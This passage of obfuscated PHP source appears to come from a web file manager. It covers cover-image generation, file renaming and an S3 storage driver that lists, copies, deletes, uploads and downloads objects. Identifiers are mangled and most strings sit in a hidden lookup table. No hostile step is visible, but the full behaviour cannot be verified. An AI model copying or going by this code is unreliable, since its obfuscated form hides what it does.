$ƒ¢ª¥×†[$ø™“šä„[32]]); } $šİµÇÔ‚ = IO::fileNameExist($äÕ¨Àı, $úë±ˆäí); if ($šİµÇÔ‚) { return IO::fileOut(KodIO::make($šİµÇÔ‚), !1, $ƒ¢ª¥×†[$ø™“šä„[32]]); } if ($¦ÔÕÓ¼ä > 1000) { $this->makeImageCover($äÕ¨Àı, $‰ÛËÉÎÅ, $úë±ˆäí, $¦ÔÕÓ¼ä); $this->makeImageCover($äÕ¨Àı, $‰ÛËÉÎÅ, "\x63\157\166\145\x72\x5f{$Ø“îŞ£}\x5f\x32\x35\60\x2e\x70\156\147", 250); $šİµÇÔ‚ = IO::fileNameExist($äÕ¨Àı, $úë±ˆäí); if ($šİµÇÔ‚) { return IO::fileOut(KodIO::make($šİµÇÔ‚), !1, $ƒ¢ª¥×†[$ø™“šä„[32]]); } die; } if (!kodIO::allowCover($ƒ¢ª¥×†)) { return $this->fileOut($‰ÛËÉÎÅ, !1, $ƒ¢ª¥×†[$ø™“šä„[32]]); } $şËş…ò˜ = Cache::get($úë±ˆäí); if ($şËş…ò˜ == $ø™“šä„[197] || $şËş…ò˜ == $ø™“šä„[198]) { echo $şËş…ò˜; die; } Cache::set($úë±ˆäí, $ø™“šä„[198], 60); $Ç¹ü€Ÿš = array($äÕ¨Àı, $ƒ¢ª¥×†[$ø™“šä„[87]], $úë±ˆäí, $¦ÔÕÓ¼ä); $Å€é§ù¾ = $ø™“šä„[199] . $ƒ¢ª¥×†[$ø™“šä„[79]] . $ø™“šä„[200] . $úë±ˆäí . $ø™“šä„[201] . $ƒ¢ª¥×†[$ø™“šä„[32]] . $ø™“šä„[202] . $ƒ¢ª¥×†[$ø™“šä„[87]]; TaskQueue::add($ø™“šä„[203], $Ç¹ü€Ÿš, $Å€é§ù¾, $úë±ˆäí); } public function makeImageCover($¶şİÕ, $œÒâœ‹ë, $Íû°ÃÚ», $´ˆµ¬•) { $ÌÀ›ùÄµ =& $_SERVER[åÄ¼Ùßš]; if (IO::fileNameExist($¶şİÕ, $Íû°ÃÚ»)) { return $ÌÀ›ùÄµ[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ÉÇ‘Ş¥· = $this->getPathOuter($œÒâœ‹ë); $Û„ñ£ˆ = DATA_THUMB . $Íû°ÃÚ»; del_file($Û„ñ£ˆ); $ƒ…Ûá… = IO::copy($ÉÇ‘Ş¥·, TEMP_FILES, !1, $Íû°ÃÚ»); if (!@file_exists($ƒ…Ûá…)) { return $ÌÀ›ùÄµ[205]; } ImageThumb::createThumb($ƒ…Ûá…, $Û„ñ£ˆ, $´ˆµ¬•, $´ˆµ¬• * 10); if (@file_exists($Û„ñ£ˆ)) { Cache::remove($Íû°ÃÚ»); return IO::move($Û„ñ£ˆ, $¶şİÕ); } Cache::set($Íû°ÃÚ», $ÌÀ›ùÄµ[197], 600); del_file($Û„ñ£ˆ); return $ÌÀ›ùÄµ[206] . $ƒ…Ûá… . $ÌÀ›ùÄµ[74]; } public function fileOutImageServer($¦ÀµÛÑ¦, $ÉÈ‹Ë  = 250) { $this->fileOutImage($¦ÀµÛÑ¦, $ÉÈ‹Ë ); } public function fileNameAuto($è¯·²Öí, $ÛŒò™Á, $³“æèí = REPEAT_RENAME, $ÈÍ—Û«¶ = false) { $¸ãÄ“àé =& $_SERVER[åÄ¼Ùßš]; $´ÄäÍŠ = $è¯·²Öí === $¸ãÄ“àé[12] ? $ÛŒò™Á : rtrim($è¯·²Öí, $¸ãÄ“àé[8]) . $¸ãÄ“àé[8] . $ÛŒò™Á; if ($³“æèí == REPEAT_REPLACE || !$this->exist($´ÄäÍŠ) || $ÈÍ—Û«¶ && $³“æèí != REPEAT_RENAME_FOLDER) { return $ÛŒò™Á; } if ($³“æèí == REPEAT_SKIP) { return !1; } $¯ºùÉú  = $¸ãÄ“àé[10] . get_path_ext($ÛŒò™Á); $¯ºùÉú  = $¯ºùÉú  == $¸ãÄ“àé[10] || $ÈÍ—Û«¶ ? $¸ãÄ“àé[12] : $¯ºùÉú ; $şˆ²× ˆ = 1; $Ï—Û’ì = substr($ÛŒò™Á, 0, strlen($ÛŒò™Á) - strlen($¯ºùÉú )); $¨‡ ´£Ï = $Ï—Û’ì . "\x28{$şˆ²× ˆ}\51{$¯ºùÉú }"; while ($this->exist(rtrim($è¯·²Öí, $¸ãÄ“àé[8]) . $¸ãÄ“àé[8] . $¨‡ ´£Ï)) { $¨‡ ´£Ï = $Ï—Û’ì . "\50{$şˆ²× ˆ}\x29{$¯ºùÉú }"; $şˆ²× ˆ++; } return $¨‡ ´£Ï; } private function fileNameAutoList($£´ì‘¯, $½ğäãô¬, $ïãÔ¶« = false) { $À®Š³î´ =& $_SERVER[åÄ¼Ùßš]; $Š¹€µğÊ = $this->listPath($£´ì‘¯, !0); $Š¹€µğÊ = array_merge($Š¹€µğÊ[$À®Š³î´[85]], $Š¹€µğÊ[$À®Š³î´[86]]); $Œ˜îßÔÇ = array_to_keyvalue($Š¹€µğÊ, $À®Š³î´[12], $À®Š³î´[32]); $ğ›êóşœ = $À®Š³î´[10] . get_path_ext($½ğäãô¬); $ğ›êóşœ = $ğ›êóşœ == $À®Š³î´[10] || $ïãÔ¶« ? $À®Š³î´[12] : $ğ›êóşœ; $ãêŠÛ§ = substr($½ğäãô¬, 0, strlen($½ğäãô¬) - strlen($ğ›êóşœ)); $‹‹íÆ‘ = $ãêŠÛ§ . "\50\x30\51{$ğ›êóşœ}"; for ($•öËÄ¿µ = 1; $•öËÄ¿µ <= count($Œ˜îßÔÇ) + 1; $•öËÄ¿µ++) { $‹‹íÆ‘ = $ãêŠÛ§ . "\50{$•öËÄ¿µ}\51{$ğ›êóşœ}"; if (!in_array_not_case($‹‹íÆ‘, $Œ˜îßÔÇ)) { return $‹‹íÆ‘; } } return $‹‹íÆ‘; } public function listAllFiles($äöÈïÖÙ, $€Ó­Û³€) { $‹ÁÊÚòê =& $_SERVER[åÄ¼Ùßš]; if (empty($€Ó­Û³€)) { return array(); } $¹úŠÉ›ó = array_keys($€Ó­Û³€); $òçªø± = array(); $äöÈïÖÙ = trim($äöÈïÖÙ, $‹ÁÊÚòê[8]); foreach ($€Ó­Û³€ as $è‘ùŠ¾ => $À¯ˆÏ) { $¥…±´ÓÌ = ltrim(substr(trim($è‘ùŠ¾, $‹ÁÊÚòê[8]), strlen($äöÈïÖÙ)), $‹ÁÊÚòê[8]); if (substr($è‘ùŠ¾, -1) == $‹ÁÊÚòê[8]) { $¥…±´ÓÌ = rtrim($¥…±´ÓÌ, $‹ÁÊÚòê[8]) . $‹ÁÊÚòê[8]; } $òçªø± = array_merge($òçªø±, $this->slicePath($¥…±´ÓÌ)); } $ë›¢ÖŞÖ = array(); foreach (array_unique($òçªø±) as $ÃêÓõ) { $¼¹—Ê€ä = array($‹ÁÊÚòê[87] => $this->getPathOuter($‹ÁÊÚòê[8] . $äöÈïÖÙ . $‹ÁÊÚòê[8] . $ÃêÓõ), $‹ÁÊÚòê[78] => 1, $‹ÁÊÚòê[79] => 0); if (substr($ÃêÓõ, -1) != $‹ÁÊÚòê[8]) { $¼¹—Ê€ä[$‹ÁÊÚòê[78]] = 0; $¡ÉŞ¢üÊ = $this->getPath($äöÈïÖÙ . $‹ÁÊÚòê[8] . $ÃêÓõ); if (isset($€Ó­Û³€[$¡ÉŞ¢üÊ])) { $¬®Œ¨× = $€Ó­Û³€[$¡ÉŞ¢üÊ]; if (isset($¬®Œ¨×[$‹ÁÊÚòê[79]])) { $¼¹—Ê€ä[$‹ÁÊÚòê[79]] = intval($¬®Œ¨×[$‹ÁÊÚòê[79]]); } if (isset($¬®Œ¨×[$‹ÁÊÚòê[207]])) { $¼¹—Ê€ä[$‹ÁÊÚòê[88]] = intval($¬®Œ¨×[$‹ÁÊÚòê[207]]); } } } $ë›¢ÖŞÖ[] = $¼¹—Ê€ä; } return $ë›¢ÖŞÖ; } public function slicePath($©ÍÍ¬ˆ) { $·í†¹”ô =& $_SERVER[åÄ¼Ùßš]; $èŞÏ…å© = explode($·í†¹”ô[8], trim($©ÍÍ¬ˆ, $·í†¹”ô[8])); $‘ª˜ÄÕĞ = 0; do { ++$‘ª˜ÄÕĞ; $÷ô»Ï“ü[] = implode($·í†¹”ô[8], array_slice($èŞÏ…å©, 0, $‘ª˜ÄÕĞ)) . $·í†¹”ô[8]; } while ($‘ª˜ÄÕĞ < count($èŞÏ…å©)); $÷ô»Ï“ü[count($èŞÏ…å©) - 1] = $©ÍÍ¬ˆ; return $÷ô»Ï“ü; } public function getHost() { $‡¼Ì®Ñ =& $_SERVER[åÄ¼Ùßš]; $ÏüøÙ’Ã = parse_url(trim($this->domain, $‡¼Ì®Ñ[8])); $”íçúçÙ = isset($ÏüøÙ’Ã[$‡¼Ì®Ñ[208]]) ? $ÏüøÙ’Ã[$‡¼Ì®Ñ[208]] : http_type(); $ÅÀÉİº½ = isset($ÏüøÙ’Ã[$‡¼Ì®Ñ[209]]) ? $ÏüøÙ’Ã[$‡¼Ì®Ñ[209]] : $ÏüøÙ’Ã[$‡¼Ì®Ñ[87]]; if (isset($ÏüøÙ’Ã[$‡¼Ì®Ñ[210]])) { $ÅÀÉİº½ .= $‡¼Ì®Ñ[4] . $ÏüøÙ’Ã[$‡¼Ì®Ñ[210]]; } return $”íçúçÙ . $‡¼Ì®Ñ[211] . $ÅÀÉİº½; } public function pathEncode($ µĞ˜’Ì) { $¿ù¼îÆÖ =& $_SERVER[åÄ¼Ùßš]; return str_replace($¿ù¼îÆÖ[212], $¿ù¼îÆÖ[8], rawurlencode($ µĞ˜’Ì)); } public function writeLog($‚ùÛ´óĞ = '', $€†Š¯¦º = false) { $ß°È©– =& $_SERVER[åÄ¼Ùßš]; $÷ó‰ÆÊÀ = in_array(ACTION, array($ß°È©–[213], $ß°È©–[214])); if (!$÷ó‰ÆÊÀ && !GLOBAL_DEBUG) { return; } $Ä°¬»¨ = $‚ùÛ´óĞ; static $ƒ¾İ½Ò = null; if (!$ƒ¾İ½Ò) { $ƒ¾İ½Ò = strtoupper($this->getType()); } $‚ùÛ´óĞ = $ƒ¾İ½Ò . $ß°È©–[215] . $‚ùÛ´óĞ; if ($€†Š¯¦º) { $¶±Û€€ê = error_get_last(); if ($¶±Û€€ê) { $‚ùÛ´óĞ = array($‚ùÛ´óĞ, $¶±Û€€ê); } } write_log($‚ùÛ´óĞ, $ß°È©–[216]); if ($÷ó‰ÆÊÀ) { throw new Exception($Ä°¬»¨); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‚ÜçËâ¢) { set_timeout(); require_once SDK_DIR . $_SERVER[åÄ¼Ùßš][217]; parent::__construct(); $this->_init($‚ÜçËâ¢); } public function _init($©–Ë¯ßò) { $¢É†§´ò =& $_SERVER[åÄ¼Ùßš]; $this->config = $©–Ë¯ßò; foreach ($©–Ë¯ßò as $…º˜¾ŞŞ => $°ö³îá—) { if (isset($this->{$…º˜¾ŞŞ})) { $this->{$…º˜¾ŞŞ} = $°ö³îá—; } } $this->endpoint = $©–Ë¯ßò[$¢É†§´ò[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $šûØŒÎ¬ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($šûØŒÎ¬, 0, 7) == $¢É†§´ò[219]) { $šûØŒÎ¬ = $¢É†§´ò[220] . substr($šûØŒÎ¬, 7); } $this->client->setEndpoint($šûØŒÎ¬); if (in_array(ACTION, array($¢É†§´ò[213], $¢É†§´ò[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ùÌŠúÔü = "\x76\64") { $this->signVer = $ùÌŠúÔü; $this->client->setSignVersion($ùÌŠúÔü); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $¾ğÜµší) { return null; } } public function isBucketCors() { $·¦¸ØÙŞ =& $_SERVER[åÄ¼Ùßš]; $İ†ÚÅ½ = $this->getBucketCors(); if (!$İ†ÚÅ½ || !is_array($İ†ÚÅ½)) { return !1; } if (!is_array($İ†ÚÅ½[$·¦¸ØÙŞ[221]])) { $İ†ÚÅ½[$·¦¸ØÙŞ[221]] = explode($·¦¸ØÙŞ[50], $İ†ÚÅ½[$·¦¸ØÙŞ[221]]); } if ($İ†ÚÅ½[$·¦¸ØÙŞ[222]] != $·¦¸ØÙŞ[223] || !in_array($·¦¸ØÙŞ[223], $İ†ÚÅ½[$·¦¸ØÙŞ[221]])) { return !1; } $­æş×ºˆ = array_map($·¦¸ØÙŞ[224], $İ†ÚÅ½[$·¦¸ØÙŞ[225]]); if (!is_array($­æş×ºˆ)) { $­æş×ºˆ = array(); } $ú³·ÖÏ« = array($·¦¸ØÙŞ[226], $·¦¸ØÙŞ[227], $·¦¸ØÙŞ[228], $·¦¸ØÙŞ[229], $·¦¸ØÙŞ[230]); $ôñÂ“»³ = array_diff($ú³·ÖÏ«, $­æş×ºˆ); return empty($ôñÂ“»³); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($£œ›ı‰ß, $åÑí÷ìª = '', $Óâ·ÉºØ = REPEAT_RENAME) { $Òû¼Í·ø = $this->setContent($£œ›ı‰ß, $åÑí÷ìª); if ($Òû¼Í·ø !== !1) { return $this->getPathOuter($£œ›ı‰ß); } return !1; } public function mkdir($Ò¼›é‡Õ, $¼‘Ûà€ñ = REPEAT_SKIP) { $Üª„Ôü— =& $_SERVER[åÄ¼Ùßš]; if (empty($Ò¼›é‡Õ) && $Ò¼›é‡Õ !== $Üª„Ôü—[231]) { return !1; } if ($¼‘Ûà€ñ && $this->_isFolder($Ò¼›é‡Õ)) { return $this->getPathOuter($Ò¼›é‡Õ); } $§¢×Äîö = $this->setContent($Ò¼›é‡Õ, $Üª„Ôü—[12], !0); if ($§¢×Äîö !== !1) { return $this->getPathOuter($Ò¼›é‡Õ); } return !1; } public function copyFile($½Œ»«Ş, $Ã ™«Ö£, $ù¡…“Í¸ = array()) { $” ³Ô¸† =& $_SERVER[åÄ¼Ùßš]; $‚¯ š½Ş = $this->objectMeta($½Œ»«Ş); if (!$‚¯ š½Ş) { return !1; } if ($‚¯ š½Ş[$” ³Ô¸†[79]] <= 1024 * 1024 * 200) { $š£íò = $this->client->copyObject($this->bucket, $½Œ»«Ş, $this->bucket, $Ã ™«Ö£, $” ³Ô¸†[232], $ù¡…“Í¸); } else { $š£íò = $this->client->multiCopyObject($this->bucket, $½Œ»«Ş, $this->bucket, $Ã ™«Ö£, $ù¡…“Í¸); } $š£íò = $š£íò ? $this->getPathOuter($Ã ™«Ö£) : !1; return $š£íò; } public function moveFile($æ¢İïĞ, $Î¡Ç„„Ñ) { if ($this->copyFile($æ¢İïĞ, $Î¡Ç„„Ñ)) { $this->delFile($æ¢İïĞ); return $this->getPathOuter($Î¡Ç„„Ñ); } return !1; } public function delFile($«š¢ûÚõ) { return $this->client->deleteObject($this->bucket, $«š¢ûÚõ); } public function delFolder($»´êÖŸã) { $Ã¤ÁÃ„ó =& $_SERVER[åÄ¼Ùßš]; if (!$this->exist($»´êÖŸã)) { return !0; } $this->listItemCache = !1; $ªù™„ÊÒ = $this->fileList($»´êÖŸã); $this->listItemCache = !0; $„õŒíŠÏ = trim($»´êÖŸã, $Ã¤ÁÃ„ó[8]) . $Ã¤ÁÃ„ó[8]; if (!empty($»´êÖŸã) && $»´êÖŸã !== $Ã¤ÁÃ„ó[231] && !in_array($„õŒíŠÏ, $ªù™„ÊÒ[$Ã¤ÁÃ„ó[85]])) { $ªù™„ÊÒ[$Ã¤ÁÃ„ó[85]][] = $„õŒíŠÏ; } $ßµ¹¼ß = $this->delByBatch($ªù™„ÊÒ[$Ã¤ÁÃ„ó[86]]); if (!$ßµ¹¼ß) { return !1; } $ßµ¹¼ß = $this->delByBatch($ªù™„ÊÒ[$Ã¤ÁÃ„ó[85]]); if (!$ßµ¹¼ß) { return !1; } return $this->delFile($„õŒíŠÏ); } private function delByBatch($ÛÆ¶ãßñ) { foreach (array_chunk($ÛÆ¶ãßñ, 1000) as $›¢Ğé¹Á) { $¦ãíÅü… = $this->client->deleteObjects($this->bucket, $›¢Ğé¹Á); if (!$¦ãíÅü…) { return !1; } } return !0; } public function rename($ŠÇÑ ¢¯, $´æØ¤³í) { return $this->renameObject($ŠÇÑ ¢¯, $´æØ¤³í); } public function listPath($‚¢–èæç, $ÀéĞ¸“— = false) { $˜ ³Î¯ =& $_SERVER[åÄ¼Ùßš]; $Ÿİ–›•À = $this->fileList($‚¢–èæç, $˜ ³Î¯[8], !0); foreach ($Ÿİ–›•À[$˜ ³Î¯[85]] as $í¥Å¥‚É => $‘“Ê‰ÒÜ) { $Ÿİ–›•À[$˜ ³Î¯[85]][$í¥Å¥‚É] = $this->folderInfo($‘“Ê‰ÒÜ, $ÀéĞ¸“—, $‘“Ê‰ÒÜ); } foreach ($Ÿİ–›•À[$˜ ³Î¯[86]] as $í¥Å¥‚É => $‘“Ê‰ÒÜ) { $Ÿİ–›•À[$˜ ³Î¯[86]][$í¥Å¥‚É] = $this->fileInfo($‘“Ê‰ÒÜ[$˜ ³Î¯[32]], $ÀéĞ¸“—, $‘“Ê‰ÒÜ); } return $Ÿİ–›•À; } protected function infoChildren($ßàï§İÁ, &$ãŸû¸¡¶) { $°ıàï™… =& $_SERVER[åÄ¼Ùßš]; $îÔÎâÚ = $this->fileList($ßàï§İÁ, $°ıàï™…[12], !0); $ãŸû¸¡¶[$°ıàï™…[81]] += count($îÔÎâÚ[$°ıàï™…[85]]); $ãŸû¸¡¶[$°ıàï™…[80]] += count($îÔÎâÚ[$°ıàï™…[86]]); foreach ($îÔÎâÚ[$°ıàï™…[86]] as $©¼ÆšÎ¯) { if (!$©¼ÆšÎ¯ || !$©¼ÆšÎ¯[$°ıàï™…[79]]) { continue; } $ãŸû¸¡¶[$°ıàï™…[79]] += $©¼ÆšÎ¯[$°ıàï™…[79]]; } } private function fileInfo($Ÿû²¦­â, $Š•™ßˆ° = false, $ã—¯®•µ = array()) { $åó §ÔÅ =& $_SERVER[åÄ¼Ùßš]; $ÜØáŸ·‹ = array($åó §ÔÅ[32] => $this->pathThis($Ÿû²¦­â), $åó §ÔÅ[87] => $this->getPathOuter($Ÿû²¦­â), $åó §ÔÅ[33] => $åó §ÔÅ[233], $åó §ÔÅ[169] => $this->ext($Ÿû²¦­â), $åó §ÔÅ[79] => isset($ã—¯®•µ[$åó §ÔÅ[79]]) ? $ã—¯®•µ[$åó §ÔÅ[79]] : 0); if ($Š•™ßˆ°) { return $ÜØáŸ·‹; } $ÜØáŸ·‹[$åó §ÔÅ[234]] = $ÜØáŸ·‹[$åó §ÔÅ[88]] = 0; $ÜØáŸ·‹[$åó §ÔÅ[235]] = $ÜØáŸ·‹[$åó §ÔÅ[236]] = !0; if (empty($ã—¯®•µ)) { $ã—¯®•µ = $this->objectMeta($Ÿû²¦­â); if (!$ã—¯®•µ) { return $ÜØáŸ·‹; } } if (isset($ã—¯®•µ[$åó §ÔÅ[237]]) && $ã—¯®•µ[$åó §ÔÅ[237]]) { $ÜØáŸ·‹[$åó §ÔÅ[238]] = $ã—¯®•µ[$åó §ÔÅ[237]]; } if (isset($ã—¯®•µ[$åó §ÔÅ[207]])) { $ÜØáŸ·‹[$åó §ÔÅ[88]] = $ã—¯®•µ[$åó §ÔÅ[207]]; } if (isset($ã—¯®•µ[$åó §ÔÅ[79]])) { $ÜØáŸ·‹[$åó §ÔÅ[79]] = $ã—¯®•µ[$åó §ÔÅ[79]]; } return $ÜØáŸ·‹; } private function folderInfo($ˆİ›”Å¤, $ØôÁè“ = false, $õùÔ×ñ‡ = array()) { $¡‘¤èĞÜ =& $_SERVER[åÄ¼Ùßš]; $öÎ¥ğ¾‰ = array($¡‘¤èĞÜ[32] => $this->pathThis($ˆİ›”Å¤), $¡‘¤èĞÜ[87] => $this->getPathOuter($¡‘¤èĞÜ[8] . $ˆİ›”Å¤), $¡‘¤èĞÜ[33] => $¡‘¤èĞÜ[78]); if ($ØôÁè“) { return $öÎ¥ğ¾‰; } $öÎ¥ğ¾‰[$¡‘¤èĞÜ[234]] = $öÎ¥ğ¾‰[$¡‘¤èĞÜ[88]] = 0; $öÎ¥ğ¾‰[$¡‘¤èĞÜ[235]] = $öÎ¥ğ¾‰[$¡‘¤èĞÜ[236]] = !0; if ($ˆİ›”Å¤ == $¡‘¤èĞÜ[12]) { return $öÎ¥ğ¾‰; } if (empty($õùÔ×ñ‡)) { $õùÔ×ñ‡ = $this->objectMeta(trim($ˆİ›”Å¤, $¡‘¤èĞÜ[8]) . $¡‘¤èĞÜ[8]); } if (isset($õùÔ×ñ‡[$¡‘¤èĞÜ[207]])) { $öÎ¥ğ¾‰[$¡‘¤èĞÜ[234]] = $õùÔ×ñ‡[$¡‘¤èĞÜ[207]]; } return $öÎ¥ğ¾‰; } private function fileList($Äüû, $Ãô¨õ§ = '', $÷ıüÅ¹ô = 0) { $æĞÑãÆÎ =& $_SERVER[åÄ¼Ùßš]; $öÛõèì = rtrim($Äüû, $æĞÑãÆÎ[8]) . $æĞÑãÆÎ[8]; $¶Ù‡¬ŒÎ = $this->listObjs($öÛõèì, null, null, $Ãô¨õ§); if (!$¶Ù‡¬ŒÎ) { return array($æĞÑãÆÎ[85] => array(), $æĞÑãÆÎ[86] => array()); } $£·±Êºİ = $šÛğª› = array(); foreach ($¶Ù‡¬ŒÎ[$æĞÑãÆÎ[239]] as $‹ßşŞˆ¥) { $äïÊ„’í = $‹ßşŞˆ¥[$æĞÑãÆÎ[32]]; if ($äïÊ„’í == $öÛõèì) { continue; } $ÙÒñúÕ‚ = isset($‹ßşŞˆ¥[$æĞÑãÆÎ[79]]) ? $‹ßşŞˆ¥[$æĞÑãÆÎ[79]] : 0; $€Ã¿¶Š­ = $ÙÒñúÕ‚ == 0 && substr($äïÊ„’í, strlen($äïÊ„’í) - 1, 1) == $æĞÑãÆÎ[8] ? !0 : !1; $this->cacheMethodInfoSet($äïÊ„’í, $€Ã¿¶Š­, $‹ßşŞˆ¥); if ($€Ã¿¶Š­) { $£·±Êºİ[] = $äïÊ„’í; continue; } $šÛğª›[] = $÷ıüÅ¹ô ? $‹ßşŞˆ¥ : $äïÊ„’í; } foreach ($¶Ù‡¬ŒÎ[$æĞÑãÆÎ[240]] as $‹ßşŞˆ¥) { $£·±Êºİ[] = $‹ßşŞˆ¥[$æĞÑãÆÎ[32]]; $this->cacheMethodInfoSet($‹ßşŞˆ¥[$æĞÑãÆÎ[32]], !0); } $this->cacheMethodInfoSet($Äüû, !0); return array($æĞÑãÆÎ[85] => $£·±Êºİ, $æĞÑãÆÎ[86] => $šÛğª›); } private function listObjs($‰„·ï¹×, $ ïÓƒÉ = null, $Õåá¯Øö = null, $©¼¼İî— = null) { $ÀËèøñ¥ =& $_SERVER[åÄ¼Ùßš]; $‰„·ï¹× = trim($‰„·ï¹×, $ÀËèøñ¥[8]); $ÈáŒ€ü¢ = empty($‰„·ï¹×) && $‰„·ï¹× !== $ÀËèøñ¥[231] ? $ÀËèøñ¥[12] : $‰„·ï¹× . $ÀËèøñ¥[8]; return $this->client->getBucket($this->bucket, $ÈáŒ€ü¢, $ ïÓƒÉ, $Õåá¯Øö, $©¼¼İî—, !0); } public function has($Æ…²—‚, $ç÷ÉäÚ = false, $®ÆãÅ‚Û = true) { $×ì‡‡£ =& $_SERVER[åÄ¼Ùßš]; $Æ…²—‚ = trim($Æ…²—‚, $×ì‡‡£[8]); $íÌÎ£Ä = empty($Æ…²—‚) && $Æ…²—‚ !== $×ì‡‡£[231] ? $×ì‡‡£[12] : $Æ…²—‚ . $×ì‡‡£[8]; $ß‘Š®ƒ“ = null; $®¤“ÅÜí = 500; $ò§šàü = $×ì‡‡£[8]; $—±Á˜·– = $ü» ö± = array(); while (!0) { $Œƒœ“ÅÒ = $this->listObjs($Æ…²—‚, $ß‘Š®ƒ“, $®¤“ÅÜí, $ò§šàü); if (!$Œƒœ“ÅÒ) { break; } $ß‘Š®ƒ“ = $Œƒœ“ÅÒ[$×ì‡‡£[241]]; $ÎèÖöÕ¦ = $Œƒœ“ÅÒ[$×ì‡‡£[239]]; $®Œµ¬¹Ü = $Œƒœ“ÅÒ[$×ì‡‡£[240]]; if (empty($ÎèÖöÕ¦) && empty($®Œµ¬¹Ü)) { break; } if (count($ÎèÖöÕ¦) == 1 && $ÎèÖöÕ¦[0][$×ì‡‡£[32]] == $íÌÎ£Ä) { break; } if ($ç÷ÉäÚ) { if (count($ÎèÖöÕ¦)) { $ÎèÖöÕ¦ = array_column($ÎèÖöÕ¦, $×ì‡‡£[32]); $—±Á˜·– = array_merge($—±Á˜·–, $ÎèÖöÕ¦); } if (count($®Œµ¬¹Ü)) { $®Œµ¬¹Ü = array_column($®Œµ¬¹Ü, $×ì‡‡£[32]); $ü» ö± = array_merge($ü» ö±, $®Œµ¬¹Ü); } if ($ß‘Š®ƒ“ === null) { break; } continue; } if ($®ÆãÅ‚Û) { if (!empty($ÎèÖöÕ¦)) { if (count($ÎèÖöÕ¦) > 1 || isset($ÎèÖöÕ¦[0][$×ì‡‡£[32]]) && $ÎèÖöÕ¦[0][$×ì‡‡£[32]] != $íÌÎ£Ä) { return !0; } } } else { if (!empty($®Œµ¬¹Ü)) { return !0; } } if ($ß‘Š®ƒ“ === null) { break; } } if ($ç÷ÉäÚ) { $—±Á˜·– = array_diff($—±Á˜·–, array($íÌÎ£Ä)); $—±Á˜·– = count(array_unique($—±Á˜·–)); $ü» ö± = count(array_unique($ü» ö±)); return array($×ì‡‡£[242] => $—±Á˜·–, $×ì‡‡£[243] => $ü» ö±); } return !1; } public function listAll($—á èû³) { $û…Ü½ñ =& $_SERVER[åÄ¼Ùßš]; $Ï®ö“ˆ = $this->fileList($—á èû³, $û…Ü½ñ[12], !0); $—º¬‹ó‹ = array_to_keyvalue($Ï®ö“ˆ[$û…Ü½ñ[86]], $û…Ü½ñ[32]); foreach ($Ï®ö“ˆ[$û…Ü½ñ[85]] as $¾ŞÈÙÕ) { if (is_string($¾ŞÈÙÕ)) { $—º¬‹ó‹[$¾ŞÈÙÕ] = array($û…Ü½ñ[79] => 0); } } return $this->listAllFiles($—á èû³, $—º¬‹ó‹); } public function canRead($’á«´ê) { $á¨ºÏÎî =& $_SERVER[åÄ¼Ùßš]; $¢å¿‰µÑ = $this->client->getAccessControlPolicy($this->bucket, $’á«´ê); if (!$¢å¿‰µÑ) { return !1; } return in_array($¢å¿‰µÑ, array($á¨ºÏÎî[244], $á¨ºÏÎî[245], $á¨ºÏÎî[246])) ? !0 : !1; } public function canWrite($Ù¿õÃş‡) { $Û°üÚ³ó =& $_SERVER[åÄ¼Ùßš]; $¾éßÊïü = $this->client->getAccessControlPolicy($this->bucket, $Ù¿õÃş‡); if (!$¾éßÊïü) { return !1; } return in_array($¾éßÊïü, array($Û°üÚ³ó[244], $Û°üÚ³ó[245])) ? !0 : !1; } public function getContent($²ñóîÕ) { return $this->client->getObject($this->bucket, $²ñóîÕ); } public function setContent($åçûÅËú, $ö€ÆÉŞ = '', $§×ÅĞ¡¶ = false) { $ÂÉ¥Á‚Î =& $_SERVER[åÄ¼Ùßš]; $åçûÅËú = $§×ÅĞ¡¶ ? trim($åçûÅËú, $ÂÉ¥Á‚Î[8]) . $ÂÉ¥Á‚Î[8] : $åçûÅËú; $ÛÏ‘ëØö = get_file_mime(get_path_ext($åçûÅËú)); $ç”µ°» = $this->client->putObject($ö€ÆÉŞ, $this->bucket, $åçûÅËú, $ÂÉ¥Á‚Î[232], array(), $ÛÏ‘ëØö); if (!$ç”µ°») { return !1; } if ($§×ÅĞ¡¶) { return !0; } return $ç”µ°» ? !0 : !1; } public function fileSubstr($‚—®Ï—ğ, $ö€§ü€ğ, $óúÉÌÑ–) { $Ü¿Åú÷ = $ö€§ü€ğ + $óúÉÌÑ– - 1; return $this->client->getObject($this->bucket, $‚—®Ï—ğ, array($_SERVER[åÄ¼Ùßš][247] => "\142\x79\x74\x65\163\x3d{$ö€§ü€ğ}\x2d{$Ü¿Åú÷}")); } public function upload($£ó£õÉ, $ÓøĞ¼üù, $İğ‰ŸØŒ = false, $‰€ˆ¾Ëı = REPEAT_REPLACE) { $Ê„á½ =& $_SERVER[åÄ¼Ùßš]; $Àîà–’Ò = array($Ê„á½[248] => @md5_file($ÓøĞ¼üù)); $º¸”Ô®¡ = array($Ê„á½[249] => get_file_mime(get_path_ext($£ó£õÉ))); if (IO::size($ÓøĞ¼üù) <= 1024 * 1024 * 200) { $§Î±—ñ¤ = $this->client->putObjectFile($ÓøĞ¼üù, $this->bucket, $£ó£õÉ, $Ê„á½[232], $Àîà–’Ò, $º¸”Ô®¡); return !empty($§Î±—ñ¤) ? $this->getPathOuter($£ó£õÉ) : !1; } $£ÈèíÙ = $this->client->multiUploadObject($ÓøĞ¼üù, $this->bucket, trim($£ó£õÉ, $Ê„á½[8]), $Àîà–’Ò, $º¸”Ô®¡); return $£ÈèíÙ ? $this->getPathOuter($£ó£õÉ) : !1; } public function download($³ö¡Û’­, $ö¹Ï¿Û½) { if (!@is_dir($this->pathFather($ö¹Ï¿Û½)) && !IO::mkdir($this->pathFather($ö¹Ï¿Û½))) { return !1; } $«»çæë = $this->client->getObject($this->bucket, $³ö¡Û’­, array(), $ö¹Ï¿Û½); return $«»çæë !== !1 